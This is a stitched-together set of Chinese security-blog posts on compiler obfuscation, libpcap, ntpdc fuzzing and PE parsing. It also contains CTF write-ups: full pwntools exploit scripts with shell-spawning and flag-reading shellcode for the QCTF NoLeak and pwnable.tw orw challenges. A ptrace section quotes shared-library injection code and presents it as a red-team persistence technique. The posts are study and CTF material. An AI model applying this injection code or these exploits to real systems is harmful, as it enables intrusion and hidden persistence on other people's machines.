IR都是用于描述代码运算的模型，但两者的抽象层次是不同的。之前想过一个问题，就是为什么编译器/虚拟机需要引入中间码/字节码，现在大概可以理解，源码通过编译前端语法分析后生成抽象语法树(AST),问题出现了，只是抽象语法树的话，编译器并不理解编码者的代码用意，也就不好直接通过语法树翻译可执行代码，所以才引入了一个虚拟层，对语法树进行归纳，用一种更低层级的代码(字节码)来表示，这样编译器后端就能更轻松的去解析代码，最终生成可执行代码。为什么说java的bytecode层级要高一点呢，因为java的字节码的语义和java语言的语法结构有非常直接的对应关系，包含大量的(类java的)面向对象语言的高层操作，例如虚函数，接口方法调用。说直白点，光看java字节码你就能看出这是java写的；而LLVM的IR相对来说更底层，没有暴露具体平台/语言的相关特征，所以可以理解成一种中层IR，层级比java的bytecode是要低的。 0x04 OLLVMLLVM前端是Clang，当对源代码进行编译生成IR中间码以后，优化器会对IR进行优化，然后后端生成执行代码。试想一下如果IR进行优化的过程可控，那么LLVM编译后端生成的代码也会是可控的，基于这个原理，OLLVM应运而生，做法就是基于LLVM开发一些pass来对IR进行优化(修改)，然后控制生成的机器码。OLLVM本身只支持源码&中间码加固，它的保护是基于代码级别的；如果想要做基于二进制的OLLVM加固，需要首先通过反汇编引擎(类似的有capstone)把二进制程序指令抽出，并转为自己的虚拟指令，VMP代码虚拟化保护就是做的类似的工作，这种保护模式需要对指令进行抽取分析转换再植入，难度较大，对于代码混淆来说，基于LLVM对IR进行处理就行了。下面是一些用于混淆的成熟开源项目，打算之后来一波源码分析。 OLLVMHikariArmariris(孤挺花) 1、编译OLLVM项目中集成了LLVM，所以不需要单独安装LLVM环境，这边参照官网的说明进行编译安装。一开始用的是最新版的LLVM(version–4)，发现编译报错，果断换了一个低一点的版本，发现编译可以继续了。 这边有个坑，编译的时候说xxx已经存在，看dalao博客找到的编译选项，可以正常编译 cmake -DCMAKE_BUILD_TYPE=Release -DLLVM_INCLUDE_TESTS=OFF ../obfuscator/ 然后就是缓慢的编译过程。。。。。。 orz………焦灼编译到百分之三十多的时候，突然进度条就卡住了，然后编译过程崩溃，查了一下好像是内存分配的太少了，导致进程卡死，于是给虚拟机加了两个G，继续编译，发现报错: g++: internal compiler error: Killed (program cc1plus) 查了下资料发现还是内存不足。。。。(我都给了四个G了) 解决方法是加一个临时的交换分区 123456sudo dd if=/dev/zero of=/swapfile bs=64M count=16 sudo mkswap /swapfile sudo swapon /swapfile After compiling, you may wish toCode: sudo swapoff /swapfile sudo rm /swapfile 最后不容易终于编译成功了，build/bin目录下生成了编译前端 2、混淆参数OLLVM有一些混淆参数，类似的有字符串加密、控制流扁平化、指令替换、控制流伪造等等 1、控制流扁平化 clang -mllvm -fla test.c -o test1 2、指令替换 clang -mllvm -sub test.c -o test2 3、控制流伪造 clang -mllvm -bcf test.c -o test3 对比一下混淆编译之后的可执行文件大小 在文件比较小的情况下好像差别并不明显2333333，OLLVM牛逼(滑稽)。 3、混淆效果先贴一下test.c的源码 在ida里面看一下混淆以后的效果 右边是开启控制流扁平化以后的程序的ida视图，左边是未添加编译保护的程序的控制流图 可以看到程序逻辑至少复杂了一个量级，而且一些常量被替换了，导致分析起来也觉得难以理解。OLLVM牛逼！！！ 0x05 总结这篇文章只是记录了一下学习LLVM&OLLVM的过程，其实说实话并没有进行比较详细的分析，还有一些拓展面也没有想好怎么写，等下次再填坑吧。","link":"/2019/04/03/LLVM%E5%88%9D%E6%8E%A2/"},{"title":"Libpcap性能问题总结","text":"背景在进程网络日志捕获的技术选型这块的当初想了很久，备选方案有如下几种：1、cn_proc2、proc遍历3、netfilter4、auditd5、libpcap综合考虑得出利弊如下：1、cn_proc用进程回调代替网络回调，只能抓到进程创建后立即产生网络连接的日志，对于具有潜伏特性或多线程发包的进程这种方式会存在大量漏报；2、遍历/proc/net/tcp(6)，只能拿到inode，要做进程关联需要去做二次遍历，cpu消耗较大，走调度的话则会漏掉很多数据，无法做稍细的检测，不优雅；3、netfilter是内核提供的机制，但调研显示不同系统的内核函数具有较大差异，需要做适配，且其hook内核tcp协议栈在大流量环境下会有一定性能影响，但比较好的一点是可以拿到数据包的关联进程信息，不用做二次遍历；4、auditd同样是内核提供的机制，稳定是其一个优点，但由于是对所有内核系统调用去做过滤，不可避免对内核的负载会较高。5、libpcap底层基于bpf，稳定是一个特点，但也同样存在无法执行关联进程、性能影响较大的问题。因为曾经用到过libpcap，且在其性能问题上踩过坑，这边对libpcap的性能问题做下总结。 Libpcap实现机制正常情况下接收的网络数据包首先会进到网卡，网卡接收到数据包发送中断通知cpu，cpu根据中断号找中断向量和对应驱动的中断处理函数，中断处理函数对网卡过来的数据做一层封装，输出成内核网络包相关数据结构的类型（sk_buff/msbuf），之后发送到数据链路层做报文的合法性检查，然后发送给更上层的tcp/ip协议栈对数据包做报文解析，最终应用层程序通过文件描述符（inode）将内核队列中的网络数据通过socket通道copy到用户态进行处理。大体流程基本就是这样。 libpcap的工作原理如下图所示。当一个数据包到达网卡时，通过内核提供的旁路机制拷贝一份数据包到bpf过滤器，其实现方式是通过创建内核socket，接收来自数据链路层驱动的网络数据包，然后使用bpf自身的the network tap组件接收来自socket的数据包并发送给the bpf filter过滤组件；bpf根据已经定义好的包过滤规则对数据包进行过滤，匹配成功的放到内核缓冲区，并等待用户态调系统调用去取（read）；匹配失败的数据包则直接drop。 性能问题libpcap的性能问题在于： 1、内核通过旁路机制copy的流量会走bpf过滤，加重了对内核的负担，不过由于libpcap在bpf这块的规则并不复杂，所以影响不是非常大 2、用户态通过系统调用从内核缓存中取数据，而走系统调用在用户/内核间来回切换效率是非常低的，因为系统调用要做一系列操作，包括上下文环境保存、切换内核栈以及某些系统调用额外的一些安全性检查等等，导致的结果就是频繁的系统调用不仅慢而且耗cpu，这个是libpcap性能问题的根源 3、libpcap本身未与进程关联，用户态拿到的还是只是五元组，要与进程关联还是只能遍历proc，这块的cpu消耗也不低，甚至在一些大流量环境下占用会非常高；但是比不调度的纯proc遍历要稍好，毕竟是走网络包回调的。 改进&补救措施libpcap有一个魔改过的版本叫libpcap-mmap，其通过内核->用户的内存映射将保存bpf滤出的数据存储空间映射为一块共享内存，这样用户态应用程序从队列里取数据就不用走系统调用了。但内核和用户操作同一片内存不可避免容易引起竞态问题，这边暂时不知道libpcap-mmap是怎么处理的，因为也是今天刚看到这个项目，后面调研和测试后再来具体和libpcap对比下优劣势。 总结比较理想的捕获手段应该是这样的： 1、优雅。尽量不走遍历，最好有直接的回调，信号量也算。 2、稳定。最好是内核机制支持，兼容性好，不需要自己去写lkm。 3、性能。cpu占用","link":"/2020/08/02/Libpcap%E6%80%A7%E8%83%BD%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/"},{"title":"My first blog","text":"人生短暂，一切都如过眼云烟；有的人把人生看做舞台，努力活出自己的精彩；有的人甘于平淡，于人海中隐匿身影，不露锋芒；有的人遭受失败一蹶不振，人生至此成了煎熬；有的人于失败中崛起，从此艰难困苦，不再彷徨。 人生路，亦是一条成长路，突然发现年少轻狂时被自己嗤之以鼻的梦想原来是如此有意思的一个东西，还有荣誉，看来，有些东西并不是真的毫无价值，只是可能当初你并没有发现它的价值。于我而言，人生就如同一场旅行，重要的是路上的风景，而不是什么时候会走到路的尽头，所以，我活的很开心，因为不用去管太多。但我也知道我的使命，我不想我这一生活的庸碌没有价值，我不想在人生的旅途中毫无目的的观望，我也不想我走着走着就走到了旅路尽头。所以，我渴望精彩的人生，我渴望我的青春能够像炎炎夏日中的向日葵释放绚烂的光芒:生如夏花所以，我选择了ctf，渴望能在这个安全界“电竞游戏”中挥洒青春。与天斗其乐无穷，与地斗其乐无穷，与人斗其乐无穷，得到的哪有s争来的好。梦想之花如是绽放。 ps:好久没有写过日记了…..就相当于是一个纪念吧….纪念第一次写博客","link":"/2017/09/30/My-first-blog/"},{"title":"Linux ptrace so库注入分析","text":"前言hw期间需要准备红队不同生命周期中使用的工具，作为一名二进制选手（伪），理所应当的承担起了主机层内网权限维持这块的工作输出，包括手法、自动化工具（开源、自写）、rootkit、多版本适配的魔改系统so等等。整理的过程也是学习的过程，这里打算分三部分进行记录，主要包括ptrace注入、预加载、rootkit三块。以下首先进行的是ptrace注入这块的分析，包括原理、源码、其它三个部分。 原理在linux上，想要去做so库的动态注入无非这么几步：1、注入器（injector）使用ptrace挂载目标进程2、注入器注入加载器（loader）到目标进程3、加载器被触发进行so库注入4、目标进程初始状态还原和卸载ptrace 下面简单展开一下： 挂载目标进程 首先需要使用ptrace挂载目标进程。我们的目标是在待注入目标进程调用加载外部的（恶意）so库，这需要我们去修改目标进程的内存空间，使其能够去执行加载恶意so库的libc api；而一般情况下一个进程是无法修改另一个毫不相干的进程内存写入数据的。ptrace的作用这时就体现了出来。ptrace是linux上一个调试专用的系统调用，类似gdb、strace等跟踪调试工具基本都使用到了ptrace，它的功能是通过挂载（attach）指定进程让其成为当前进程的子进程，linux下父进程可以修改子进程的内存空间，ptrace就是利用这一点，让被挂载进程的内存空间可以被修改。如下是ptrace的api（https://linux.die.net/man/2/ptrace）： 12#include long ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data); 此处的__ptrace_request枚举类型的request参数决定了ptrace将要去执行的动作，ptrace注入需要用到的如下： 1234567PTRACE_ATTACH（挂载指定pid的进程）PTRACE_GETREGSET（读取目标进程的寄存器值）PTRACE_SETREGSET（设置目标进程的寄存器值）PTRACE_CONT（将控制权扔给目标进程运行）PTRACE_DETACH（结束卸载跟踪）PTRACE_PEEKTEXT（读取内容）PTRACE_POKETEXT（写入内容） 加载器注入 目标进程被挂载以后，注入器进程就可以修改目标进程内存空间去注入加载器了，一般来说可以将加载器代码注入到进程的头部（未开始运行），或一段连续的nop区，如果注入的是其它位置，可能会出现被修改内存的二次使用等问题。如果将加载器注入到进程头部，则需要做下内存数据备份，保证ptrace退出后的子进程正常运行。加载器注入后，注入器将修改子进程当前程序计数器（eip）的值，使其指向加载器，最后将控制权移交给子进程。 加载器触发 正常情况下子进程将顺利执行加载器代码，加载器会为待加载的so库路径字符串分配内存空间，并获取其参数内存地址；之后调用libc_dlopen_mode函数去加载指定路径的so库。一般来说加载so库可以选择进程默认链接的libc.so中自带的libc_dlopen_mode函数，而不使用非默认加载的libdl.so中的dlopen。加载器要注意结束后需要将控制权交给注入器进程（int3中断），因为还要去恢复一下原始状态。 状态还原 so库注入完毕后要注意恢复原本的进程内存空间状态，包括被修改的寄存器以及被覆写的内存。还原完成后结束ptrace的跟踪，将控制权最终返回给子进程。 源码这边拿开源的linux-inject项目做一波分析：项目结构还是很清晰的，三种架构的injector注入器实现，封装的ptrace、utils函数调用的头文件和函数实现，以及测试so库和测试目标程序。主要关注点还是注入器的实现。injector部分的代码非常简单清晰，先从main开始： 12345678910111213141516171819202122232425262728293031323334353637if(argc < 4){ usage(argv[0]); return 1;}char* command = argv[1];char* commandArg = argv[2];char* libname = argv[3];char* libPath = realpath(libname, NULL);char* processName = NULL;pid_t target = 0;if(!libPath){ fprintf(stderr, \"can't find file \\\"%s\\\"\\n\", libname); return 1;}if(!strcmp(command, \"-n\")){ processName = commandArg; target = findProcessByName(processName); if(target == -1) { fprintf(stderr, \"doesn't look like a process named \\\"%s\\\" is running right now\\n\", processName); return 1; } printf(\"targeting process \\\"%s\\\" with pid %d\\n\", processName, target);}else if(!strcmp(command, \"-p\")){ target = atoi(commandArg); printf(\"targeting process with pid %d\\n\", target);}else{ usage(argv[0]); return 1;} 这边没啥好说的，主要是根据参数确定不同模式，分别使用不同方式获取进程pid。 12345678910111213int libPathLength = strlen(libPath) + 1;int mypid = getpid();long mylibcaddr = getlibcaddr(mypid);long mallocAddr = getFunctionAddress(\"malloc\");long freeAddr = getFunctionAddress(\"free\");long dlopenAddr = getFunctionAddress(\"__libc_dlopen_mode\");long mallocOffset = mallocAddr - mylibcaddr;long freeOffset = freeAddr - mylibcaddr;long dlopenOffset = dlopenAddr - mylibcaddr;long targetLibcAddr = getlibcaddr(target);long targetMallocAddr = targetLibcAddr + mallocOffset;long targetFreeAddr = targetLibcAddr + freeOffset;long targetDlopenAddr = targetLibcAddr + dlopenOffset; 这边是通过自写函数（/proc/pid/maps下取数据）去获取malloc、free及__libc_dlopen_mode的libc函数地址，之后减去libc的加载地址得到偏移，之后加上目标进程libc基址得到三函数在目标进程libc中的真实地址。 12345678910111213struct user_regs_struct oldregs, regs;memset(&oldregs, 0, sizeof(struct user_regs_struct));memset(&regs, 0, sizeof(struct user_regs_struct));ptrace_attach(target);ptrace_getregs(target, &oldregs);memcpy(&regs, &oldregs, sizeof(struct user_regs_struct));long addr = freespaceaddr(target) + sizeof(long);regs.rip = addr + 2;regs.rdi = targetMallocAddr;regs.rsi = targetFreeAddr;regs.rdx = targetDlopenAddr;regs.rcx = libPathLength;ptrace_setregs(target, &regs); 这边开始ptrace挂载目标进程了，获取目标进程当前的所有寄存器状态并保存，然后去/proc/pid/maps下拿到目标进程代码段首地址，因为eip要指向的是当前指令的下一条指令，所以需要将当前地址+2的值赋给eip，让eip指向进程代码段收地址，最后将之前拿到的malloc、free及__libc_dlopen_mode的地址赋给目标进程当前环境下的寄存器，为加载器的代码执行做铺垫。 123456789size_t injectSharedLibrary_size = (intptr_t)injectSharedLibrary_end - (intptr_t)injectSharedLibrary;intptr_t injectSharedLibrary_ret = (intptr_t)findRet(injectSharedLibrary_end) - (intptr_t)injectSharedLibrary;char* backup = malloc(injectSharedLibrary_size * sizeof(char));ptrace_read(target, addr, backup, injectSharedLibrary_size);char* newcode = malloc(injectSharedLibrary_size * sizeof(char));memset(newcode, 0, injectSharedLibrary_size * sizeof(char));memcpy(newcode, injectSharedLibrary, injectSharedLibrary_size - 1);newcode[injectSharedLibrary_ret] = INTEL_INT3_INSTRUCTION;ptrace_write(target, addr, newcode, injectSharedLibrary_size); 1234567891011121314151617181920212223242526272829303132333435363738void injectSharedLibrary(long mallocaddr, long freeaddr, long dlopenaddr){ asm( \"push %rsi \\n\" \"push %rdx\" ); asm( \"push %r9 \\n\" \"mov %rdi,%r9 \\n\" \"mov %rcx,%rdi \\n\" \"callq *%r9 \\n\" # malloc \"pop %r9 \\n\" \"int $3\" ); asm( \"pop %rdx \\n\" \"push %r9 \\n\" \"mov %rdx,%r9 \\n\" \"mov %rax,%rdi \\n \"movabs $1,%rsi \\n\" \"callq *%r9 \\n\" # dlopenaddr \"pop %r9 \\n\" \"int $3\" ); asm( \"mov %rax,%rdi \\n\" \"pop %rsi \\n\" \"push %rbx \\n\" \"mov %rsi,%rbx \\n\" \"xor %rsi,%rsi \\n\" \"int $3 \\n\" \"callq *%rbx \\n\" # free \"pop %rbx\" );}void injectSharedLibrary_end(){} injectSharedLibrary就是加载器负责加载so，这边首先将injectSharedLibrary与injectSharedLibrary_end地址相减拿到injectSharedLibrary函数的字节码长度，之后在加载器代码底部插入int3指令（加载器代码执行完后将控制权交给控制器进行内存空间恢复），同时备份目标进程首地址与injectSharedLibrary代码长度相同size的字节码，最后将加载器代码覆写进子进程首地址后injectSharedLibrary_size大小的内存空间，完成加载器的代码注入。 123456789101112131415161718192021222324252627282930313233343536ptrace_cont(target);struct user_regs_struct malloc_regs;memset(&malloc_regs, 0, sizeof(struct user_regs_struct));ptrace_getregs(target, &malloc_regs);unsigned long long targetBuf = malloc_regs.rax;if(targetBuf == 0){ fprintf(stderr, \"malloc() failed to allocate memory\\n\"); restoreStateAndDetach(target, addr, backup, injectSharedLibrary_size, oldregs); free(backup); free(newcode); return 1;}ptrace_write(target, targetBuf, libPath, libPathLength);ptrace_cont(target);struct user_regs_struct dlopen_regs;memset(&dlopen_regs, 0, sizeof(struct user_regs_struct));ptrace_getregs(target, &dlopen_regs);unsigned long long libAddr = dlopen_regs.rax;if(libAddr == 0){ fprintf(stderr, \"__libc_dlopen_mode() failed to load %s\\n\", libname); restoreStateAndDetach(target, addr, backup, injectSharedLibrary_size, oldregs); free(backup); free(newcode); return 1;}if(checkloaded(target, libname)){ printf(\"\\\"%s\\\" successfully injected\\n\", libname);}else{ fprintf(stderr, \"could not inject \\\"%s\\\"\\n\", libname);}ptrace_cont(target); 这边执行ptrace_cont将控制权交给目标进程，目标进程执行加载器代码首先执行malloc，为待加载so库字符串分配（libPathLength大小的）地址空间，之后int3中断返回注入器上下文根据寄存器中的函数返回值判断malloc是否成功，然后执行ptrace_write将待加载字符串写到前面分配的内存空间中，继续ptrace_cont执行目标进程；目标进程使用__libc_dlpoen_mode打开指定so库后继续中断返回调用进程，同样的，通过寄存器中的函数返回值判断so库是否加载成功，最后继续ptrace_cont调用free释放分配的内存空间（这边貌似没执行到call就返回了）。 1234restoreStateAndDetach(target, addr, backup, injectSharedLibrary_size, oldregs);free(backup);free(newcode);return 0; 123456void restoreStateAndDetach(pid_t target, unsigned long addr, void* backup, int datasize, struct REG_TYPE oldregs){ ptrace_write(target, addr, backup, datasize); ptrace_setregs(target, &oldregs); ptrace_detach(target);} 最后恢复被注入进程的环境，包括代码段内存和寄存器，然后ptrace_detach结束ptrace。 其它一般来说so库注入用在攻击上听到的比较多，经常是在拿到主机权限后进行权限维持和后渗透，以及给游戏做破解做热补丁等等。在权限维持领域来说，与ld_preload技术相比较而言各有优劣，展开来讲，so注入可以去动态修改目标进程，即使目标进程已经运行，而ld_preload无法对当前未创建的进程生效；so库注入相比ld_preload而言更隐蔽；同时如果想要改变程序的执行流程一般so注入是要去做hook的，相对来说比较复杂；ptrace过程中的中断和执行流程改变在多线程环境下也容易出现并发问题。 总结业务导向的结果就是小本本上记下的待研究todolist越来越多，感慨时间有限而学海无涯，东西太多，学不完了。 参考链接：https://jmpews.github.io/2016/12/27/pwn/linux%E8%BF%9B%E7%A8%8B%E5%8A%A8%E6%80%81so%E6%B3%A8%E5%85%A5/https://github.com/gaffe23/linux-inject/blob/master/slides_BHArsenal2015.pdfhttps://payloads.online/archivers/2020-01-01/2","link":"/2020/07/06/Linux-ptrace-so%E5%BA%93%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/"},{"title":"QCTF 2018 NoLeak","text":"QCTF 2018NoLeak wp​ 这道题是一道unsorted bin attack + fastbin attck的题。 拿到题扔ida一看发现无printf函数无法泄露地址，所以就无法构造system指令执行，checksec看下发现未开nx保护，此时基本可以确定是写shellcode(堆题写shellcode之前没做过)。 审下函数发现edit函数检查不全面导致可以修改已经free的chunk的两个指针fd和bk，这里可以利用 unsorted bin的特性，修改free后的unsorted bin中的chunk的fd和bk，使修改的target地址指向unsortedbin中的链表头，由于其载入内存的基地址是一样的，且libc后三个字节是固定的，所以可以通过libc-database识别libc版本并得到函数的offset（题目给了libc库），然后修改target指向的链表头地址的后三个字节，使其指向想要覆盖的got表地址。但是单靠unsortedbin无法直接进行任意地址读写，这里还需要用到fastbin attack（unsorted bin这里可以理解为起到了leak的作用) 构造fake chunk进行任意地址写。 ​ 攻击者可以通过修改fastbin中freechunk的fd，使其指向一个fake chunk，然后进行一次malloc，第二次malloc就能在指定位置创建chunk了，也就是可以向指定地址写数据。这里需要注意的是当malloc fake chunk的时候 ，*(&(fake chunk)+8) 也就是fake chunk的size大小必须要属于fastbin对应的大小，否则在进行分配的时候glibc会报错。当成功malloc fake chunk后，我们已经能够向指定位置写入数据，这里我们向bss段保存chunk user data段指针的buff写入包含buff自身地址信息的数据，这样利用程序中的update函数我们就能向bss段写入shellcode，然后我们就可以通过覆写got表(__malloc_hook)为指向shellcode的地址来最终get shell。exp如下: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687from pwn import *context(log_level='debug',arch='amd64',os='linux')p=process('./NoLeak')def create(size,data): p.recvuntil('Your choice :') p.sendline('1') p.recvuntil('Size: ') p.sendline(str(size)) p.recvuntil('Data: ') p.sendline(str(data))def delete(index): p.recvuntil('Your choice :') p.sendline('2') p.recvuntil('Index: ') p.sendline(str(index))def update(index,size,data): p.recvuntil('Your choice :') p.sendline('3') p.recvuntil('Index: ') p.sendline(str(index)) p.recvuntil('Size: ') p.sendline(str(size)) p.recvuntil('Data: ') p.sendline(str(data))def exit(): p.recvuntil('Your choice :') p.sendline('4')magic=0x0000000000601040shellcode=asm(shellcraft.sh())shellcode='\\x6a\\x42\\x58\\xfe\\xc4\\x48\\x99\\x52\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5e\\x49\\x89\\xd0\\x49\\x89\\xd2\\x0f\\x05'create(0x60,'0000')create(0x80,'1111') create(0x80,'2222') delete(1)update(1,0x10,p64(magic+0x20)*2)create(0x80,'3333')delete(0)update(0,0x8,p64(0x60106d))create(0x60,'3333')create(0x60,'aaa'+p64(0x601070)+p64(0x601080))update(8,1,p64(0x10))update(6,8,p64(0x601080))update(9,len(shellcode),shellcode)p.interactive() ​ 总结一下这题思路其实很明确，ida中看到没开泄露地址的函数加上nx保护没开所以想到写shellcode，然后想到got表覆写，由于不能直接泄露地址想到可以利用unsorted bin的链表头指针间接泄露基址，找到libc版本库确定要覆盖函数的低三字节，利用fastbin fake chunk attack向堆指针buff区写入一个包含buff自身信息的指针，然后就能向低三字节写入查找到的地址，之后利用update函数在bss段buff区后面写入shellcode，最后再利用update函数向got表写入指向shellcode的指针，当调用malloc函数时由于malloc-hook已经被覆盖，所以能直接跳去执行shellcode。","link":"/2018/07/27/NoLeak/"},{"title":"Pwnable.tw-orw","text":"0x01 IDA分析拿到程序不多bb，首先DIE看一波文件类型，发现是gcc编译的32位的文件，没加壳。直接拖进IDA，发现前面有个seccomp函数，并不知道做了什么操作，先不管，继续往下看，发现有个直接往bss上写shellcode，然后执行shellcode的操作。 0x02 SECCOMPEXP写完后跑了一下发下并没有弹shell，奇怪，进去跟了一下，发现int 80调用execve执行/bin/sh后一条指令报错，怀疑是shellcode的原因，更换了几个shellcode发现仍然不行，这时猜测是SECCOMP的原因，查了一下发现这是个类似黑白名单的东西，把一些危险函数过滤掉，在pwn题中此工具做沙箱保护很常见，通常禁用一部分syscall，比如execve等，这样就没法直接弹shell了。 0x03 How to reverse在这个成熟的保护机制下衍生了很多逆向工具，这边使用的是Seccomp-tools，看下效果。 可以看到程序只允许执行open、read、write、exit等函数，直接syscall或者execve是不被允许的，所以此题只能在open、read、write这三个函数的基础上去思考如何利用。 0x04 Shellcode虽然不能直接写execve弹shell，但是换个思路利用open打开文件句柄，read在打开的文件描述符上进行读取，之后用write输出到标准输出仍然可以达到一样的效果。这边根据Linux下的系统调用编号进行编写shellcode。shellcode如下： 123456789101112131415161718192021shellcode=\"\"\"mov eax,5push 0x00006761push 0x6c662f77push 0x726f2f65push 0x6d6f682fmov ebx,espxor ecx,ecxxor edx,edxint 0x80mov eax,3mov ecx,ebxmov ebx,3mov edx,0x40int 0x80mov eax,4mov ebx,1mov edx,0x40int 0x80 open那里把路径压栈后把esp值赋给ebx，open函数打开一个文件句柄，存储在eax中，read函数从eax中存储的句柄进行读取。 0x05 EXP这边贴下完整的EXP： 12345678910111213141516171819202122232425262728from pwn import *context(log_level='debug',arch='i386',os='linux')p=remote('chall.pwnable.tw',10001)p.recvuntil(':')shellcode=\"\"\"mov eax,5;push 0x00006761;push 0x6c662f77;push 0x726f2f65;push 0x6d6f682f;mov ebx,esp;xor ecx,ecx;xor edx,edx;int 0x80;mov eax,3;mov ecx,ebx;mov ebx,eax;mov edx,0x40;int 0x80;mov eax,4;mov ebx,1;mov edx,0x40;int 0x80;\"\"\"p.sendline(asm(shellcode))p.interactive() 看到有dalao直接用pwntools的shellcraft模块做的，羡慕一波 0x06 GetFlag不过最终还是拿到了Flag，这道题主要就是一个SECCOMP需要注意下，还有就是如果是手写shellcode，需要注意syscall的调用号。","link":"/2019/04/17/Pwnable-tw-orw/"},{"title":"Ntpdc Fuzz","text":"写在前面ntp是网络时间协议，用来同步网络中的各个计算机时间，之前偶然看到一篇国外dalao对ntp漏洞进行分析的文章，觉得挺有意思的。那个cve好像是2015年出的，是一个Buffer over flow，可以利用。时间相对来说还是有点早的，自己折腾环境测试了一下，发现居然洞没了，翻遍了官网也没找到备份，orz。。。。。想着总不能一无所获吧，就用afl-fuzz给ntp的各个版本来了一发，还真跑出了几个异常，这边就来复盘下分析的过程。 0x01 入坑网上闲逛的时候无意中看到国外师傅对Ntpdc Local Buffer Overflow的复盘过程，贴一下，看着还有模有样的，成功入坑。 这边他是在x86 Debian 7上测试的，没有环境，就用ubuntu12.05 LTS代替，发现并没有出现Segmentation fault，猜测可能是环境的原因，或者是官方已经把有洞的程序打patch了(历史版本也会打patch的吗，有点不可思议)。 可以看到本地并没有成功，挺不甘心的，fuzz来一梭子。 0x02 Fuzz Fuzz了几个主流版本，包括最新版，跑了半天，报了不少crashs和hangs，接下来分析一下。 Ntp 4.2.6p3 首先看下版本，这个是源码编译的ntpdc 4.2.6p3版本，老外复现的这个local buffer overflow就是这个版本。 可以看到报洞了,这边开启了转储文件，可以gdb分析一下的，但其实没必要，因为是源码编译，所以直接输出了报错点所在的模块中的行数，可以直接审源码看洞；另外，其实其实这个洞是无法利用的，所以可以优先在gdb中调一下，观察下最后crash时的register，看我们是否能够控制某些寄存器，这是能进行利用&提权的重要条件。 可以看到crash的时候并没有显示莫寄存器和输入是有关联的，所以这个洞能利用的可能性很小了。 ida打开，由报错信息定位到漏洞位置，发现刚才的aborted是触发了开发者自己定义的一个异常处理函数，假如输入长度大于0x49的话，认证失败。 上面是isc_assertion_failed函数部，开发者自定义的abort函数。 Ntp 4.2.8p11//由于调试环境有问题，从ubuntu16.04换到ubuntu12.05 ntpdc 4.2.8p11版本，上面的输入长度限制的bug已经修复了。 但是fuzz还是跑出来crash，同样是由于是输入获取不严谨导致的问题，这边报错信息是*** stack smashing detected ***，猜测存在栈溢出。 gdb载入，重定向输入文件到程序，运行，i reg查看寄存器 发现edx被覆写成0x41414141，观察堆栈函数调用，进行调用溯源，gdb重新跟一波，发现触发了canary导致程序直接退出。 由于没有泄露canary，这边暂时还没什么好的方法可以绕过，也就无法利用。 ida里比对一下，分析下逻辑。 Ntp 4.2.8p13这个版本是目前的最新版，相对其它几个版本来说还是很完美的，p11的buffer over flow的bug已经修复，fuzz跑出来的几个crash也是无法利用。NTP牛逼！！！ 0x03 总结Fuzz在实战中的作用真的很大，接下来打算去fuzz一些社区里比较陈旧的开源程序，带着去熟悉fuzz的使用&机制；复现能让你学到很多东西，可以多去复现一些已知的CVE。基本就这些了，加油加油~","link":"/2019/04/27/Ntpdc-Fuzz/"},{"title":"PE解析工具编写","text":"PE文件解析工具编写有的时候一条路上走远了，走的太长，真的会忘记自己当前最需要什么，感慨自己还是成熟的太晚，眼界还是不够开阔。师傅之前一直说的需要提升代码和项目编写的能力，直到现在才意识到，已经很晚了，留下的时间不多了。 根据实际出发，单纯的漏洞分析我入门相对较晚，瓶颈期较长，所以导致最后学的东西零零散散不精通，直到现在手上也没有一枚CVE号，感慨一波自己还是太菜，所以把目光转向游戏安全，因为乙方没有自己项目或者产品的话在市场和行业上只能是处于弱势，一些小的乙方公司更是如此，单纯的接单授权做测试和漏洞挖掘终究不是长远之计，未来这些小公司可能甚至会因为接不到活而饿死（猜测），而甲方有自己项目的话，可能情况会相对更好，毕竟能自力更生，游戏公司特别如此，有一群二次元死肥宅供着，怎么样都难亏吧，专门做二进制漏洞分析和挖掘的话现在只有大厂的研究室要了，因为单纯的做研究是没有直接的经济产出的，能挖到CVE还好说，挖不到就尴尬，所以现在把目光转向更普遍产业链更广一点的行业，这里选择游戏安全，其一，本人对游戏较感兴趣，相关技术包括hook，注入，外挂，调试反调试之类的还是懂一点，其二，游戏最近几年经济下行状态下应该是个不错的选择，相比一些大而空的项目，游戏公司算是比较实在或者说传统的了，投资人愿意烧钱，消费者也愿意买单，美滋滋，这里从实际出发，实事求是，其三，本人一直想涉足客户端开发方向（高大上），如果能实习的话，还是希望能学到一点端游开发相关的。所以最近的话打算把上海各个厂的游戏安全实习岗都投一波，首先是希望能收获一波面试经验，提升自己的面试技术，其次是如果遇到比较牛逼的面试官被吊锤，希望能了解到自己的不足，反向鞭策一下自我，说真的师傅一走过的有点闲了。以上就是这段时间的打算，总的来说就是学习+投简历，希望能获得好的效果，拿到几个offer。这几天闲来无事想要学下CPP，嫌菜鸟教程啥的讲的基础&直接翻大部头容易犯困，就直接开撸，项目驱动型鞭策自己去了解相关的知识，写了好几天了，今天写的差不多了，推上gayhub以后打算写一篇博客，算是对自己的一种激励吧。腾讯的面试官说的很对，写博客其实作用真的很大，只是坚持和不坚持的问题，写习惯就好了，人家夜影写了三年了。。。。orz工具源代码主要包含三个部分，一个头文件，里面定义了非常多的接口，有些实现了，还有很多没有实现，因为PE文件格式中有很多一部分字节码代表的信息并不是很重要，所以相关用不到的功能并没有实现。之后是接口实现，写在一个cpp文件里，代码直接将整个PE工具的功能放在一个类里，之后就是对相关功能的实现。第三部分是一个demo，用来调用第二个文件中的功能，解析EXE文件并输出相关信息的。这里大概讲一下实现第二部分，也就是接口实现代码的内容，首先CreateFile创建文件对象，获取文件对象句柄，其次CreateFileMapping映射文件对象到内存中，返回一个指向映射区域内存的句柄/指针。这个指针是指向载入内存的可执行文件开头的，但是单纯一个指针并不能表示什么，这里我们把它强制转换成IMAGE_DOS_HEADER*，这样这个指针就由一个单纯的内存指针变成了一个结构体指针（其实底层区别并不大），IMAGE_DOS_HEADER类型在winnt.h中有定义，类似这种 12345678910111213141516171819202122/*typedef struct _IMAGE_DOS_HEADER { // DOS .EXE headerWORD e_magic; // Magic numberWORD e_cblp; // Bytes on last page of fileWORD e_cp; // Pages in fileWORD e_crlc; // RelocationsWORD e_cparhdr; // Size of header in paragraphsWORD e_minalloc; // Minimum extra paragraphs neededWORD e_maxalloc; // Maximum extra paragraphs neededWORD e_ss; // Initial (relative) SS 